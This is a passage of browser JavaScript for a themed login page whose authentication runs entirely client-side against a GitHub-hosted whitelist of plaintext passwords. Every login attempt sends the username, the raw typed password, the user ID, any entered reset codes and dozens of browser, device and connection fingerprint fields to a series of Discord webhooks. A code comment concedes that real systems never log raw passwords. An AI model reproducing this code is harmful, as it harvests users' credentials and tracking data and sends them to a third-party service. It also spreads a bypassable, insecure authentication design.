        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Discord API error: ${response.status} - ${errorText}`);
        }
        console.log(`Webhook sent successfully to ${url} with ${finalEmbeds.length} embed(s).`);
    } catch (error) {
        console.error('Error sending webhook:', error);
        logError(`Failed to send webhook to ${url}: ${error.message}`);
    }
}

// Function to load the whitelist from GitHub
async function loadWhitelist() {
    try {
        const response = await fetch(WHITELIST_URL);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        whitelist = await response.json();
        console.log("Whitelist loaded:", whitelist);
        logAdminActivity("Whitelist loaded successfully.", "system_info");
    } catch (error) {
        console.error("Failed to load whitelist:", error);
        logError(`Failed to load whitelist: ${error.message}`);
    }
}

// Helper to parse user agent for more details
function parseUserAgent() {
    const ua = navigator.userAgent;
    let browserName = "Unknown Browser";
    let browserVersion = "Unknown";
    let os = "Unknown OS";
    let osVersion = "Unknown";
    let engine = "Unknown Engine";
    let deviceType = "Desktop";

    // Browser Detection
    if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) {
        browserName = "Chrome";
        browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown";
        engine = "Blink";
    } else if (/Firefox/.test(ua)) {
        browserName = "Firefox";
        browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown";
        engine = "Gecko";
    } else if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua)) {
        browserName = "Safari";
        browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
        engine = "WebKit";
    } else if (/Edge/.test(ua)) {
        browserName = "Edge";
        browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || "Unknown";
        engine = "EdgeHTML/Blink"; // Edge switched to Chromium/Blink
    } else if (/OPR|Opera/.test(ua)) {
        browserName = "Opera";
        browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || "Unknown";
        engine = "Blink/Presto";
    } else if (/Trident/.test(ua) || /MSIE/.test(ua)) {
        browserName = "Internet Explorer";
        browserVersion = ua.match(/(?:MSIE |rv:)(\d+\.?\d*)/)?.[1] || "Unknown";
        engine = "Trident";
    }

    // OS Detection
    if (/Windows NT 10.0/.test(ua)) { os = "Windows"; osVersion = "10"; }
    else if (/Windows NT 6.3/.test(ua)) { os = "Windows"; osVersion = "8.1"; }
    else if (/Windows NT 6.2/.test(ua)) { os = "Windows"; osVersion = "8"; }
    else if (/Windows NT 6.1/.test(ua)) { os = "Windows"; osVersion = "7"; }
    else if (/Macintosh|Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "Unknown"; }
    else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Unknown"; deviceType = "Mobile"; }
    else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([\d_.]+)/)?.[1]?.replace(/_/g, '.') + " (iOS)" || "Unknown"; deviceType = "Mobile"; }
    else if (/Linux/.test(ua)) { os = "Linux"; osVersion = "Unknown"; } // More specific Linux versions are hard from UA

    // Device Type refinement
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "Tablet";
    if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|webos|fennec|kindle/i.test(ua)) deviceType = "Mobile";

    return { browserName, browserVersion, os, osVersion, engine, deviceType };
}


// Functions to get browser, device, and connection information (returning fields array)
function getBrowserDetailedInfo() {
    const parsedUA = parseUserAgent();
    const fields = [
        { name: "Raw User Agent", value: navigator.userAgent || "N/A", inline: false },
        { name: "Browser Name", value: parsedUA.browserName, inline: true },
        { name: "Browser Version", value: parsedUA.browserVersion, inline: true },
        { name: "OS Name", value: parsedUA.os, inline: true },
        { name: "OS Version", value: parsedUA.osVersion, inline: true },
        { name: "Rendering Engine", value: parsedUA.engine, inline: true },
        { name: "Device Type (Parsed)", value: parsedUA.deviceType, inline: true },
        { name: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
        { name: "Do Not Track", value: navigator.doNotTrack === "1" ? "Yes" : (navigator.doNotTrack === "0" ? "No" : "N/A"), inline: true },
        { name: "Language", value: navigator.language || "N/A", inline: true },
        { name: "Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true },
        { name: "Referrer", value: document.referrer || "N/A", inline: false },
        { name: "Current URL", value: window.location.href || "N/A", inline: false },
        { name: "Window Inner Size", value: `${window.innerWidth || 'N/A'}x${window.innerHeight || 'N/A'}`, inline: true },
        { name: "Window Outer Size", value: `${window.outerWidth || 'N/A'}x${window.outerHeight || 'N/A'}`, inline: true },
        { name: "Viewport Size", value: `${document.documentElement.clientWidth || 'N/A'}x${document.documentElement.clientHeight || 'N/A'}`, inline: true },
        { name: "WebGL Support", value: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch (e) { return false; } })() ? "Yes" : "No", inline: true },
        { name: "Canvas Support", value: !!window.CanvasRenderingContext2D ? "Yes" : "No", inline: true },
        { name: "WebRTC Support", value: (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia) ? "Yes" : "No", inline: true },
        { name: "Geolocation Support", value: !!navigator.geolocation ? "Yes" : "No", inline: true },
        { name: "WebSockets Support", value: !!window.WebSocket ? "Yes" : "No", inline: true },
        { name: "Web Workers Support", value: !!window.Worker ? "Yes" : "No", inline: true },
        { name: "Battery Status API", value: !!navigator.getBattery ? "Yes" : "No", inline: true },
        { name: "Vibration API", value: !!navigator.vibrate ? "Yes" : "No", inline: true },
        { name: "Media Devices API", value: !!navigator.mediaDevices ? "Yes" : "No", inline: true },
        { name: "VR/AR API (WebXR)", value: !!navigator.xr ? "Yes" : "No", inline: true },
        { name: "Gamepad API", value: !!navigator.getGamepads ? "Yes" : "No", inline: true },
        { name: "Web Share API", value: !!navigator.share ? "Yes" : "No", inline: true },
        { name: "Credential Management API", value: !!navigator.credentials ? "Yes" : "No", inline: true },
        { name: "Payment Request API", value: !!window.PaymentRequest ? "Yes" : "No", inline: true },
        { name: "Web Authentication API", value: !!navigator.credentials && !!navigator.credentials.create ? "Yes" : "No", inline: true },
        { name: "IndexedDB Support", value: !!window.indexedDB ? "Yes" : "No", inline: true },
        { name: "Web SQL DB Support", value: !!window.openDatabase ? "Yes" : "No", inline: true },
        { name: "OffscreenCanvas Support", value: !!window.OffscreenCanvas ? "Yes" : "No", inline: true },
        { name: "Permissions API", value: !!navigator.permissions ? "Yes" : "No", inline: true },
        { name: "Clipboard API", value: !!navigator.clipboard ? "Yes" : "No", inline: true }
    ];
    return fields;
}

function getDeviceDetailedInfo() {
    const parsedUA = parseUserAgent();
    const fields = [
        { name: "OS Name", value: parsedUA.os, inline: true },
        { name: "OS Version", value: parsedUA.osVersion, inline: true },
        { name: "Platform", value: navigator.platform || "N/A", inline: true },
        { name: "Device Type (Parsed)", value: parsedUA.deviceType, inline: true },
        { name: "Screen Total Width", value: screen.width ? `${screen.width}px` : "N/A", inline: true },
        { name: "Screen Total Height", value: screen.height ? `${screen.height}px` : "N/A", inline: true },
        { name: "Screen Available Width", value: screen.availWidth ? `${screen.availWidth}px` : "N/A", inline: true },
        { name: "Screen Available Height", value: screen.availHeight ? `${screen.availHeight}px` : "N/A", inline: true },
        { name: "Color Depth", value: screen.colorDepth ? `${screen.colorDepth}-bit` : "N/A", inline: true },
        { name: "Pixel Depth", value: screen.pixelDepth ? `${screen.pixelDepth}-bit` : "N/A", inline: true },
        { name: "Device Pixel Ratio (DPR)", value: window.devicePixelRatio ? `${window.devicePixelRatio}:1` : "N/A", inline: true },
        { name: "Screen Orientation", value: screen.orientation?.type || "N/A", inline: true },
        { name: "Hardware Concurrency (CPU Cores)", value: navigator.hardwareConcurrency || "N/A", inline: true },
        { name: "Device Memory (GB)", value: navigator.deviceMemory || "N/A", inline: true },
        { name: "Max Touch Points", value: navigator.maxTouchPoints || "N/A", inline: true },
        { name: "Touch Screen Support", value: (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Yes" : "No", inline: true },
        { name: "Keyboard Map Support", value: !!navigator.keyboard ? "Yes" : "No", inline: true },
        { name: "Pointer Lock API", value: !!document.exitPointerLock ? "Yes" : "No", inline: true },
        { name: "Speech Recognition API", value: !!(window.SpeechRecognition || window.webkitSpeechRecognition) ? "Yes" : "No", inline: true },
        { name: "Speech Synthesis API", value: !!window.speechSynthesis ? "Yes" : "No", inline: true },
        { name: "USB API", value: !!navigator.usb ? "Yes" : "No", inline: true },
        { name: "Bluetooth API", value: !!navigator.bluetooth ? "Yes" : "No", inline: true },
        { name: "NFC API", value: !!navigator.nfc ? "Yes" : "No", inline: true },
        { name: "Accelerometer Support", value: !!window.DeviceMotionEvent ? "Yes" : "No", inline: true },
        { name: "Gyroscope Support", value: !!window.DeviceOrientationEvent ? "Yes" : "No", inline: true },
        { name: "Magnetometer Support", value: !!window.DeviceOrientationEvent ? "Yes" : "No", inline: true },
        { name: "Ambient Light Sensor Support", value: 'ondevicelight' in window ? "Yes" : "No", inline: true },
        { name: "Proximity Sensor Support", value: 'ondeviceproximity' in window ? "Yes" : "No", inline: true },
        { name: "Media Capabilities API", value: !!navigator.mediaCapabilities ? "Yes" : "No", inline: true },
        { name: "Virtual Keyboard API", value: !!navigator.virtualKeyboard ? "Yes" : "No", inline: true },
        { name: "User Activation API", value: !!navigator.userActivation ? "Yes" : "No", inline: true }
    ];
    return fields;
}

function getConnectionDetailedInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const nav = navigator; // Use a shorthand for clarity
    const fields = [
        { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
        { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
        { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
        { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
        { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
        { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
        { name: "IP Address", value: "N/A (Client-side JS cannot detect public IP directly)", inline: false },
        { name: "VPN Detected", value: "N/A (Requires server-side lookup)", inline: true },
        { name: "Proxy Detected", value: "N/A (Requires server-side lookup)", inline: true },
        { name: "Public IPv6", value: "N/A (Client-side JS cannot detect directly)", inline: false },
        { name: "Local IP Addresses", value: "N/A (Requires WebRTC or server-side interaction with user consent)", inline: false },
        { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
        { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
        { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true }, // Non-standard/deprecated
        { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }, // Non-standard/deprecated
        { name: "Web Transport API", value: !!window.WebTransport ? "Yes" : "No", inline: true },
        { name: "Beacon API", value: !!nav.sendBeacon ? "Yes" : "No", inline: true },
        { name: "Background Sync API", value: !!('serviceWorker' in nav && nav.serviceWorker && nav.serviceWorker.ready && nav.serviceWorker.ready.then && 'sync' in (nav.serviceWorker.controller || {})) ? "Yes" : "No", inline: true },
        { name: "Fetch Priority API", value: !!(new Request('/', {priority: 'high'})).priority ? "Yes" : "No", inline: true },
        { name: "DNS Prefetching Support", value: "Available", inline: true },
        { name: "Preload Support", value: "Available", inline: true },
        { name: "Prerender Support", value: !!document.createElement('link').relList?.supports('prerender') ? "Yes" : "No", inline: true },
        { name: "Network Information API", value: !!nav.connection ? "Yes" : "No", inline: true },
        { name: "Service Worker Status", value: 'serviceWorker' in nav ? (nav.serviceWorker.controller ? 'Active' : 'Supported') : 'Not Supported', inline: true },
        { name: "Bluetooth Enabled", value: nav.bluetooth?.getAvailability ? "Check Required" : "N/A", inline: true }, // Requires permissions
    ];
    return fields;
}


// Update attempts display
function updateAttemptsText() {
    attemptsText.textContent = `Attempts Left: ${attempts}`;
}

// Disable inputs and submit button
function disableInputs() {
    usernameInput.disabled = true;
    passwordInput.disabled = true;
    userIDInput.disabled = true;
    submitBtn.disabled = true;
}

// Enable inputs and submit button
function enableInputs() {
    usernameInput.disabled = false;
    passwordInput.disabled = false;
    userIDInput.disabled = false;
    submitBtn.disabled = false;
}

// Show reset popup
function showResetPopup() {
    resetPopup.style.display = 'flex'; // Use flex to center content
    resetPopup.setAttribute('aria-hidden', 'false');
    resetField.focus();
}

// Hide reset popup
function hideResetPopup() {
    resetPopup.style.display = 'none';
    resetPopup.setAttribute('aria-hidden', 'true');
    resetField.value = '';
}

// Find user in whitelist
function findUser(username, userID) {
    return whitelist.find(user => user.username === username && user.userID === userID);
}

// Log attempts exceeded
async function logAttemptsExceeded(userName, inputUsername, inputPassword, inputUserID) {
    const browserInfoFields = getBrowserDetailedInfo();
    const deviceInfoFields = getDeviceDetailedInfo();
    const connectionInfoFields = getConnectionDetailedInfo();

    const fields = [
        { name: "Attempted Name", value: userName || "N/A", inline: true },
        { name: "Attempted Username", value: inputUsername || "[empty]", inline: true },
        { name: "Attempted Password (Hidden)", value: "********", inline: true },
        { name: "Attempted User ID", value: inputUserID || "[empty]", inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
        { name: "Attempts Exceeded", value: "Yes", inline: true },
        { name: "System Locked", value: "Yes", inline: true },
        // Include a subset of comprehensive info for context in this summary log
        ...browserInfoFields.slice(0, 5).map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
        ...deviceInfoFields.slice(0, 5).map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
        ...connectionInfoFields.slice(0, 5).map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
    ];

    const embeds = createEmbedsFromFields(" Login Attempts Exceeded", 0xDC143C, fields, "All login attempts have been exhausted. System is now locked.");
    await sendWebhook(webhooks.attemptExceededInformation, embeds);
}

// Reset Counter logic
async function resetCounter() {
    const enteredCode = resetField.value.trim();
    const isCorrect = enteredCode === RESET_CODE_SECRET;

    const currentUsername = usernameInput.value || 'Unknown';
    const currentPassword = passwordInput.value || 'Unknown';
    const currentUserID = userIDInput.value || 'Unknown';
    const user = findUser(currentUsername, currentUserID) || {}; // Find user info if available

    const browserInfoFields = getBrowserDetailedInfo();
    const deviceInfoFields = getDeviceDetailedInfo();
    const connectionInfoFields = getConnectionDetailedInfo();

    // RESET_INFORMATION Logging (detailed system snapshot when reset is attempted)
    const resetInfoFields = [
        { name: "Attempted Name", value: user.name || "N/A", inline: true },
        { name: "Attempted Username", value: currentUsername, inline: true },
        { name: "Attempted Password (Hidden)", value: "********", inline: true },
        { name: "Attempted User ID", value: currentUserID, inline: true },
        { name: "Entered Reset Code", value: enteredCode, inline: false },
        { name: "Reset Attempt Result", value: isCorrect ? "SUCCESS" : "FAILED", inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
        // Append all detailed browser, device, and connection info
        ...browserInfoFields.map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
        ...deviceInfoFields.map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
        ...connectionInfoFields.map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
    ];
    const resetEmbeds = createEmbedsFromFields(" Reset System Interaction", 0xFFFF00, resetInfoFields, "Details of a reset code entry attempt.");
    await sendWebhook(webhooks.resetInformation, resetEmbeds);

    if (isCorrect) {
        attempts = 5; // Reset attempts to initial value
        updateAttemptsText();
        enableInputs();
        hideResetPopup();
        errorMsg.textContent = '';
        showNotification("Login attempts reset successfully!");
        logAdminActivity("Login attempts reset via code.", "system_info", { codeEntered: enteredCode, result: "SUCCESS" });

        const correctResetEmbeds = createEmbedsFromFields(
            " Reset Code Accepted", 0x00FF00, [
            { name: "Action", value: "Attempts Reset", inline: true },
            { name: "User Context", value: currentUsername, inline: true },
            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
            ]
        );
        await sendWebhook(webhooks.correctInformation, correctResetEmbeds);

    } else {
        alert('Incorrect reset code. Try again.');
        logError("Incorrect reset code entered: " + enteredCode);
        logAdminActivity("Incorrect reset code entered.", "system_warning", { codeEntered: enteredCode, result: "FAILED" });

        const incorrectResetEmbeds = createEmbedsFromFields(
            " Incorrect Reset Code Attempt", 0xFF0000, [
            { name: "Action", value: "Attempts Not Reset", inline: true },
            { name: "User Context", value: currentUsername, inline: true },
            { name: "Incorrect Code", value: enteredCode, inline: true },
            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
            ]
        );
        await sendWebhook(webhooks.incorrectInformation, incorrectResetEmbeds);
    }
}


// Initialization sequence
window.addEventListener('load', () => {
    startInitialization();
    loadAdminLogsFromStorage(); // Load the new consolidated logs
    loadErrorLogsFromStorage(); // Keep separate for critical errors
    loadImportantDatesFromStorage();
    // Removed loadClickCountFromStorage() as its panel is gone, but count still exists
    loadWhitelist(); // Load whitelist on page load
    updateAttemptsText(); // Display initial attempts
});

function startInitialization() {
    generateCodeRain('codeRain');

    setTimeout(() => {
        document.getElementById('initText').textContent = 'Initializing Login Page...';
        setTimeout(() => {
            document.getElementById('initScreen').classList.add('hidden');
            document.getElementById('loginScreen').classList.remove('hidden');
            startClock();
        }, 2000);
    }, 3000);
}

function generateCodeRain(containerId) {
    const container = document.getElementById(containerId);
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';

    setInterval(() => {
        const char = document.createElement('div');
        char.className = 'code-char';
        char.textContent = chars[Math.floor(Math.random() * chars.length)];
        char.style.left = Math.random() * 100 + '%';
        char.style.animationDelay = Math.random() * 2 + 's';
        container.appendChild(char);

        setTimeout(() => {
            if (char.parentNode) {
                char.parentNode.removeChild(char);
            }
        }, 3000);
    }, 100);
}

function startClock() {
    updateClock();
    setInterval(updateClock, 1000);
}

function updateClock() {
    const now = new Date();
    const timeOptions = { hour12: !is24HourFormat, hour: '2-digit', minute: '2-digit', second: '2-digit' };
    const time = now.toLocaleTimeString('en-US', timeOptions);

    const date = now.toLocaleDateString('en-US', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
    });

    // Update login screen time
    document.getElementById('currentTime').textContent = time;
    document.getElementById('currentDate').textContent = date;

    // Update quickbar real-time clock if it exists
    const quickbarRealTimeClock = document.getElementById('quickbarCurrentTime');
    if (quickbarRealTimeClock) {
        quickbarRealTimeClock.textContent = time;
    }
}

function adjustZoom(delta) {
    currentZoom = Math.max(0.5, Math.min(2, currentZoom + delta));
    document.body.style.zoom = currentZoom;
    logAdminActivity('Zoom adjusted to ' + Math.round(currentZoom * 100) + '%', "user_action");
}

// Toggle functions
function setupToggles() {
    // Show password toggle
    document.getElementById('showPasswordToggle').addEventListener('click', function() {
        this.classList.toggle('active');
        const passwordField = document.getElementById('password');
        passwordField.type = this.classList.contains('active') ? 'text' : 'password';
        stats.toggleSwitches++;
        logAdminActivity('Password visibility toggled', "user_action");
    });

    // 24-hour format toggle
    document.getElementById('timeFormatToggle').addEventListener('click', function() {
        this.classList.toggle('active');
        is24HourFormat = this.classList.contains('active');
        stats.toggleSwitches++;
        logAdminActivity('Time format toggled to ' + (is24HourFormat ? '24-hour' : '12-hour'), "user_action");
    });
}

// Login function
async function attemptLogin() {
    const username = usernameInput.value;
    const password = passwordInput.value;
    const userID = userIDInput.value;

    updateAttemptsText(); // Update attempts count on UI

    const browserInfoFields = getBrowserDetailedInfo();
    const deviceInfoFields = getDeviceDetailedInfo();
    const connectionInfoFields = getConnectionDetailedInfo();

    // --- BEGIN LOGGING FOR INDIVIDUAL INPUTS AND ENVIRONMENTAL DATA (ATTEMPT START) ---

    // USERNAME_INFORMATION (Specific channel for username input)
    await sendWebhook(webhooks.usernameInformation, createEmbedsFromFields(
        " Username Attempt", 0xADD8E6, [
        { name: "Attempted Username", value: username || '[empty]', inline: true },
        { name: "Current Attempts Left", value: `${attempts}`, inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
        ...browserInfoFields.slice(0, 5).map((f, i) => ({ name: `Browser (${i+1}) - ${f.name}`, value: f.value, inline: true })), // Subset for context
        ]
    ));

    // PASSWORD_INFORMATION (Specific channel for password input)
    await sendWebhook(webhooks.passwordInformation, createEmbedsFromFields(
        " Password Attempt", 0xADD8E6, [
        { name: "Attempted Password", value: password || '[empty]', inline: true }, // Note: Real systems hash/never log raw passwords
        { name: "Current Attempts Left", value: `${attempts}`, inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
        ...deviceInfoFields.slice(0, 5).map((f, i) => ({ name: `Device (${i+1}) - ${f.name}`, value: f.value, inline: true })), // Subset for context
        ]
    ));

    // IDENTIFIER_INFORMATION (Specific channel for User ID input)
    await sendWebhook(webhooks.identifierInformation, createEmbedsFromFields(
        " User ID Attempt", 0xADD8E6, [
        { name: "Attempted User ID", value: userID || '[empty]', inline: true },
        { name: "Current Attempts Left", value: `${attempts}`, inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
        ...connectionInfoFields.slice(0, 5).map((f, i) => ({ name: `Connection (${i+1}) - ${f.name}`, value: f.value, inline: true })), // Subset for context
        ]
    ));

    // USER_INFORMATION (10+ fields for overall user context)
    await sendWebhook(webhooks.userInformation, createEmbedsFromFields(
        " Login Attempt Details", 0x00BFFF, [
        { name: "Submitted Username", value: username || "[empty]", inline: true },
        { name: "Submitted Password (Hidden)", value: "********", inline: true },
        { name: "Submitted User ID", value: userID || "[empty]", inline: true },
        { name: "Parsed Browser", value: parseUserAgent().browserName, inline: true },
        { name: "Parsed OS", value: parseUserAgent().os, inline: true },
        { name: "Parsed Device Type", value: parseUserAgent().deviceType, inline: true },
        { name: "Current URL", value: window.location.href || "N/A", inline: false },
        { name: "Login Timestamp", value: new Date().toLocaleString(), inline: false },
        { name: "Attempts Left", value: `${attempts}`, inline: true },
        { name: "User Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true }
        ]
    ));

    // BROWSER_INFORMATION (25+ fields, multiple embeds if needed)
    await sendWebhook(webhooks.browserInformation, createEmbedsFromFields(
        " Detailed Browser Information (Login Attempt)", 0x90EE90, browserInfoFields
    ));

    // DEVICE_INFORMATION (25+ fields, multiple embeds if needed)
    await sendWebhook(webhooks.deviceInformation, createEmbedsFromFields(
        " Detailed Device Information (Login Attempt)", 0xFFD700, deviceInfoFields
    ));

    // CONNECTION_INFORMATION (25+ fields, multiple embeds if needed)
    await sendWebhook(webhooks.connectionInformation, createEmbedsFromFields(
        " Detailed Connection Information (Login Attempt)", 0xFFC0CB, connectionInfoFields
    ));

    // ATTEMPT_COUNTER_INFORMATION
    await sendWebhook(webhooks.attemptCounterInformation, createEmbedsFromFields(
        " Attempt Counter Update", 0xFF4500, [
        { name: "User Context", value: username || 'unknown', inline: true },
        { name: "Attempts Remaining", value: `${attempts}`, inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
        ]
    ));

    // --- END LOGGING FOR INDIVIDUAL INPUTS AND ENVIRONMENTAL DATA (ATTEMPT START) ---


    if (!username || !password || !userID) {
        const missingFields = [];
        if (!username) missingFields.push("Username");
        if (!password) missingFields.push("Password");
        if (!userID) missingFields.push("User ID");

        const errorMessage = `Please fill all fields. Missing: ${missingFields.join(", ")}`;
        showError(errorMessage);

        // INCORRECT_INFORMATION (for general incorrectness)
        await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
            " Login Failed: Missing Fields", 0xFF0000, [
            { name: "Attempted Username", value: username || "[empty]", inline: true },
            { name: "Attempted User ID", value: userID || "[empty]", inline: true },
            { name: "Attempts Left", value: `${attempts}`, inline: true },
            { name: "Missing Fields", value: missingFields.join(", "), inline: false },
            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
            ]
        ));

        if (!username) await sendWebhook(webhooks.invaildUsernameInformation, createEmbedsFromFields(
            " Invalid Username: Empty", 0xFF0000, [{ name: "Attempted Username", value: '[empty]', inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
        ));
        if (!password) await sendWebhook(webhooks.invaildPasswordInformation, createEmbedsFromFields(
            " Invalid Password: Empty", 0xFF0000, [{ name: "Attempted Password", value: '[empty]', inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
        ));
        if (!userID) await sendWebhook(webhooks.invaildIdentifierInformation, createEmbedsFromFields(
            " Invalid User ID: Empty", 0xFF0000, [{ name: "Attempted User ID", value: '[empty]', inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
        ));

        failedLogin(username, userID);
        return;
    }

    // Check against whitelist
    const userFound = whitelist.find(user =>
        user.username === username &&
        user.password === password &&
        user.userID === userID
    );

    if (userFound) {
        await successfulLogin(username, userID);
    } else {
        let loginFailedMessages = [];
        let isAnyFieldInvalid = false;
        let usernameMatch = whitelist.some(u => u.username === username);
        let passwordMatch = false;
        let userIDMatch = false;

        if (usernameMatch) {
            const correctUser = whitelist.find(u => u.username === username);
            if (correctUser) {
                if (correctUser.password === password) passwordMatch = true;
                if (correctUser.userID === userID) userIDMatch = true;
            }
        }

        if (!usernameMatch) {
            await sendWebhook(webhooks.invaildUsernameInformation, createEmbedsFromFields(
                " Invalid Username: Not Found", 0xFF0000, [{ name: "Attempted Username", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
            ));
            loginFailedMessages.push("Username");
            isAnyFieldInvalid = true;
        }
        if (usernameMatch && !passwordMatch) {
            await sendWebhook(webhooks.invaildPasswordInformation, createEmbedsFromFields(
                " Invalid Password: Mismatch", 0xFF0000, [{ name: "Attempted Password", value: password, inline: true }, { name: "Username Context", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
            ));
            loginFailedMessages.push("Password");
            isAnyFieldInvalid = true;
        }
        if (usernameMatch && !userIDMatch) {
            await sendWebhook(webhooks.invaildIdentifierInformation, createEmbedsFromFields(
                " Invalid User ID: Mismatch", 0xFF0000, [{ name: "Attempted User ID", value: userID, inline: true }, { name: "Username Context", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
            ));
            loginFailedMessages.push("User ID");
            isAnyFieldInvalid = true;
        }

        let finalFailedMessage = `Login attempt failed for \`\`${username}\`\`: `;
        if (isAnyFieldInvalid) {
            finalFailedMessage += `Invalid ${loginFailedMessages.join(', ')}.`;
        } else {
            finalFailedMessage += `Invalid credentials (username, password, or user ID combination is incorrect).`;
        }
        // INCORRECT_INFORMATION (for general incorrectness)
        await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
            " Login Failed: Incorrect Credentials", 0xFF0000, [
            { name: "Attempted Username", value: username, inline: true },
            { name: "Attempted User ID", value: userID, inline: true },
            { name: "Attempts Left", value: `${attempts}`, inline: true },
            { name: "Validation Issue", value: loginFailedMessages.length > 0 ? `Invalid ${loginFailedMessages.join(", ")}` : "Combination Mismatch", inline: false },
            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
            ]
        ));

        failedLogin(username, userID);
    }
}

async function successfulLogin(username, userID) {
    currentUser = username;
    currentUserID = userID;

    logAdminActivity(`Successful login for user "${username}" (ID: ${userID}).`, "login_success");

    // CORRECT_INFORMATION
    const correctLoginEmbeds = createEmbedsFromFields(
        " Successful Login", 0x00FF00, [
        { name: "User", value: username, inline: true },
        { name: "User ID", value: userID, inline: true },
        { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
        ]
    );
    await sendWebhook(webhooks.correctInformation, correctLoginEmbeds);

    // SESSION_INFORMATION (Aggregates ~90+ fields, split into multiple embeds)
    const sessionInfoFields = [
        { name: "Logged-in User", value: username, inline: true },
        { name: "User ID", value: userID, inline: true },
        { name: "Session Start Time", value: new Date(stats.sessionStartTime).toLocaleString(), inline: false },
        { name: "Current Zoom Level", value: `${Math.round(currentZoom * 100)}%`, inline: true },
        { name: "Current Theme", value: isLightMode ? "Light" : "Dark", inline: true },
        { name: "Panels Grid Visible", value: (document.getElementById('panelsGrid').style.display !== 'none' && document.getElementById('panelsGrid').style.opacity !== '0') ? "Yes" : "No", inline: true },
        { name: "Admin Logs Count", value: `${adminLogs.length}`, inline: true },
        { name: "Error Logs Count", value: `${errorLogs.length}`, inline: true },
        { name: "Important Dates Count", value: `${importantDates.length}`, inline: true },
        { name: "Total Button Presses", value: `${stats.buttonPresses}`, inline: true },
        { name: "Total Toggle Switches", value: `${stats.toggleSwitches}`, inline: true },
        { name: "Total Panels Opened", value: `${stats.panelsOpened}`, inline: true },
        { name: "Total Panels Closed", value: `${stats.panelsClosed}`, inline: true },
        { name: "Total Search Queries", value: `${stats.searchQueries}`, inline: true },
        // Append all detailed browser, device, and connection info
        ...getBrowserDetailedInfo().map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
        ...getDeviceDetailedInfo().map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
        ...getConnectionDetailedInfo().map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
    ];
    const sessionEmbeds = createEmbedsFromFields(" New Session Started", 0x00BFFF, sessionInfoFields, "Detailed information about the new user session.");
    await sendWebhook(webhooks.sessionInformation, sessionEmbeds);

    // Show loading screen
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('loadingScreen').classList.remove('hidden');
    generateCodeRain('loadingCodeRain');

    setTimeout(() => {
        document.getElementById('loadingScreen').classList.add('hidden');
